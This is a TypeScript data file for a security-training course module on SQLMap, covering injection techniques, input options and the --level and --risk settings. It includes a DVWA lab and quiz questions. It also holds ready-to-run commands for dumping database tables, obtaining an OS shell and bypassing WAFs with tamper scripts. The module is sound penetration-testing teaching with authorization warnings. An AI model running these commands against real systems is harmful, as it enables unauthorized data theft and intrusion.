import type { LearningTopic } from "../types";

export const toolSqlmap: LearningTopic = {
  slug: "sqlmap",
  kind: "tool",
  title: "SQLMap",
  tagline: "Automated SQL injection detection and exploitation.",
  difficulty: "Intermediate",
  estimatedMinutes: 35,
  overview: `SQLMap is the leading open-source tool for detecting and exploiting SQL injection. It supports every major DB engine, all SQLi techniques (boolean, time-based, error-based, UNION, stacked, out-of-band), and can extract data, read files, upload webshells, and pivot into the OS.`,
  whyItMatters: `Even in 2026 SQLi is not dead. Legacy apps, custom ORMs, and dynamic query builders keep producing it. SQLMap is the fastest way to prove and quantify the finding.`,
  realWorldScenario: `A legacy search endpoint accepts \`?q=iphone\`. \`sqlmap -u '.../search?q=iphone' --batch --dbs\` finds a boolean-blind SQLi in 45 seconds and lists all 12 databases including \`customers_prod\`.`,
  objectives: [
    "Understand each SQLi technique SQLMap uses",
    "Feed SQLMap requests correctly (URL, form, cookie, header, raw request)",
    "Enumerate DBs, tables, columns, and data",
    "Use --os-shell responsibly",
    "Recognize when SQLMap is not the right tool",
  ],
  theory: `## Techniques SQLMap tries (BEUSTQ)

- **B** — Boolean-based blind
- **E** — Error-based
- **U** — UNION-based
- **S** — Stacked queries
- **T** — Time-based blind
- **Q** — Inline queries

## Input methods

- URL: \`-u "https://x/y?p=1"\`
- POST body: \`--data "user=a&pass=b"\`
- Cookie: \`--cookie "PHPSESSID=abc"\`
- Headers: \`-H "X-Api-Key: abc"\`
- Raw HTTP request: \`-r req.txt\`  ← my favorite; capture from Burp

## Risk & level

- \`--level 1..5\` — how many parameters and vectors to test
- \`--risk 1..3\` — how invasive (higher can break data)`,
  workflow: [
    "Capture the request in Burp (right-click → Copy to file)",
    "\`sqlmap -r req.txt --batch\` to test with defaults",
    "If nothing found, bump \`--level 3 --risk 2\`",
    "On confirmed injection: \`--dbs\` → \`-D dbname --tables\` → \`-T users --columns\` → \`-T users --dump\`",
    "For persistent access: \`--os-shell\` or \`--sql-shell\` (heavy — be careful)",
  ],
  commands: [
    { cmd: "sqlmap -u 'https://target/item?id=1' --batch", desc: "Basic URL test" },
    { cmd: "sqlmap -r req.txt --batch --dbs", desc: "From raw request, list DBs" },
    { cmd: "sqlmap -r req.txt -D shop -T users --dump", desc: "Dump a table" },
    { cmd: "sqlmap -r req.txt --level 3 --risk 2 --dbms mysql", desc: "Stronger test, DB-specific" },
    { cmd: "sqlmap -r req.txt --os-shell", desc: "Try to get OS-level shell (invasive)" },
    { cmd: "sqlmap -r req.txt --tamper=space2comment", desc: "Use a tamper script (WAF bypass)" },
  ],
  toolsUsed: ["sqlmap", "burp", "ghauri"],
  expectedOutput: {
    lang: "bash",
    code: `[INFO] testing 'GET parameter 'id''
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] testing 'UNION query (NULL) - 1 to 20 columns'
[INFO] GET parameter 'id' is 'UNION query' injectable

available databases [3]:
[*] information_schema
[*] shop
[*] users`,
  },
  commonMistakes: [
    "Running with default level/risk and giving up too early",
    "Using --os-shell on production without written approval",
    "Forgetting --batch → stuck at interactive prompts",
    "Ignoring WAF blocks → try tamper scripts",
    "Not saving output — SQLMap results are gold for the report",
  ],
  miniLab: {
    objective: "Exploit the SQLi in DVWA at Low security.",
    steps: [
      "Login to DVWA, set security to Low, go to SQL Injection.",
      "Capture the request in Burp, save as `dvwa.req`.",
      "`sqlmap -r dvwa.req --batch --dbs`",
      "Enumerate the `users` table and dump credentials.",
    ],
    expected: "You've extracted the DVWA users table with hashes.",
  },
  practiceQuestions: [
    "Which SQLi technique needs no output visible in the response?",
    "What's the difference between --level and --risk?",
    "Why is a raw request file often better than a URL?",
    "What does --os-shell actually do?",
  ],
  interviewQuestions: [
    "Explain how a boolean-blind SQLi works at the request/response level.",
    "How do you handle a WAF that blocks 'UNION'?",
    "How would you exploit a stored SQLi that only triggers on background jobs?",
    "When would you write your own payload rather than use SQLMap?",
  ],
  cheatsheet: [
    { cmd: "-u '<url>' / -r req.txt", desc: "Target from URL or raw request" },
    { cmd: "--batch", desc: "Assume defaults (no prompts)" },
    { cmd: "--dbs / --tables / --columns / --dump", desc: "Progressive extraction" },
    { cmd: "--level N / --risk N", desc: "Widen tests" },
    { cmd: "--tamper=<script>", desc: "Bypass WAFs" },
    { cmd: "--dbms=<name>", desc: "Skip fingerprinting" },
    { cmd: "--os-shell", desc: "OS-level shell (invasive!)" },
  ],
  references: [
    { label: "SQLMap GitHub", url: "https://github.com/sqlmapproject/sqlmap" },
    { label: "OWASP SQLi", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
  ],
  summary: `SQLMap is powerful and noisy. Always test in a lab, always capture raw requests from Burp, and never fire --os-shell without approval.`,
  callouts: [
    { type: "warning", body: "SQLMap is invasive by design. Use only against systems you own or are authorized to test." },
  ],
};
